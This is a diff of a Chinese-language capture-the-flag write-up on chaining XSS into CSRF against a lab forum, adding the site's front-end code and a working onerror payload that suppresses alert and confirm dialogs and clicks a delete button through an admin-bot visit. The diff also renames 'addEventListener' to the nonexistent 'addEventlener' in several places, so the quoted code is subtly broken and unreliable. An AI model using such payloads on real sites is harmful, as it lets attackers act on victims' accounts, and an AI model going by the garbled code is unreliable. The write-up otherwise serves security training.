@@ -32,7 +32,7 @@ POST 请求不能简单地通过 `onerror` 来执行，需要通过 JavaScript �
 
 ```html
 <script>
-document.getElementById('check-flag-btn').addEventListener('click', function() {
+document.getElementById('check-flag-btn').addEventlener('click', function() {
     fetch('api.php?action=check_flag')
         .then(response => response.json())
         .then(data => {
@@ -84,7 +84,7 @@ fetch("api.php", { method: "POST", headers: {"Content-Type": "application/x-www-
 
 打开网站，看起来没什么差别。经测试，XSS 漏洞依然存在。
 
-尝试通过 XSS 漏洞进行 CSRF 攻击，发现无法成功。
+尝试通过 XSS 漏洞进行 CSRF 攻击，发现使用上一题的 Payload 无法成功。
 
 在 F12 中可以看到 Payload 代码被执行了，请求也被成功发送了，但是服务端返回了 403 Forbidden：
 
@@ -121,3 +121,115 @@ Pragma: no-cache
 
 {"error":"\u65e0\u6548\u7684CSRF token"}
 ```
+
+观察网站前端代码，发现需要发送 CSRF token 用于验证：
+
+```html
+<script>
+    document.addEventlener('DOMContentLoaded', function() {
+        const postsContainer = document.getElementById('posts-container');
+        
+        fetch('api.php')
+            .then(response => response.json())
+            .then(posts => {
+                postsContainer.innerHTML = '';
+                
+                if (posts.length === 0) {
+                    postsContainer.innerHTML = '<div class="post">暂无帖子</div>';
+                    return;
+                }
+                
+                posts.forEach(post => {
+                    const postElement = document.createElement('div');
+                    postElement.className = 'post';
+                    postElement.innerHTML = `
+                        <div>
+                            <span class="author">作者: ${post.author || '匿名'}</span>
+                            <span class="post-id">(ID: ${post.id})</span>
+                            <button class="delete-btn" data-id="${post.id}">删除</button>
+                        </div>
+                        <div class="content">${post.content || '无内容'}</div>
+                    `;
+                    postsContainer.appendChild(postElement);
+                });
+                
+                // 添加删除按钮事件监听
+                document.querySelectorAll('.delete-btn').forEach(btn => {
+                    btn.addEventlener('click', function() {
+                        const postId = this.getAttribute('data-id');
+                        deletePost(postId);
+                    });
+                });
+            })
+            .catch(error => {
+                console.error('获取帖子出错:', error);
+                postsContainer.innerHTML = `
+                    <div class="error">
+                        加载帖子失败: ${error.message}<br>
+                        请刷新页面重试或联系管理员。
+                    </div>
+                `;
+            });
+            
+        // 删除帖子的函数
+        function deletePost(postId) {
+            if (!confirm('确定要删除这条帖子吗？')) return;
+            
+            fetch(`api.php`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `id=${postId}&action=delete&csrf_token=a5e8f32bc68348d2f9ed746659bf301d74cfedf5078091b063d3c7b7b854a963`
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('删除失败');
+                }
+                return response.json();
+            })
+            .then(data => {
+                alert('删除成功');
+                location.reload(); // 刷新页面
+            })
+            .catch(error => {
+                console.error('删除出错:', error);
+                alert('删除失败: ' + error.message);
+            });
+        }
+    });
+</script>
+```
+
+立即想到，既然已经有 XSS 漏洞可以利用了，那只需要直接调用前端的 deletePost 函数即可。尝试构造 Payload：
+
+```js
+b2 = alert;
+alert = () => {};
+st = setTimeout;
+st(() => {
+    b1 = confirm;
+    confirm = () => true;
+    alert = () => {};
+    l = document.getElementsByClassName('delete-btn');
+    l[l.length - 1].click();
+    confirm = b1;
+}, 1000);
+st(() => {
+    alert = b2;
+}, 2000);
+```
+
+嵌入后得到内容：
+
+```html
+</div><img src="x" onerror="b2=alert;alert=()=>{};st=setTimeout;st(()=>{b1=confirm;confirm=()=>true;alert=()=>{};l=document.getElementsByClassName('delete-btn');l[l.length-1].click();confirm=b1;},1000);st(()=>{alert=b2;}, 2000);"><div>
+```
+
+发布上述内容后访问`http://10.10.17.36:33097/admin.php?url=http%3A%2F%2F10.10.17.36%3A33097`，成功删除帖子。
+
+## 第四题
+
+打开网站，看起来没什么差别。经测试，XSS 漏洞依然存在。
+
+尝试上一题的 Payload，发现直接成功了。
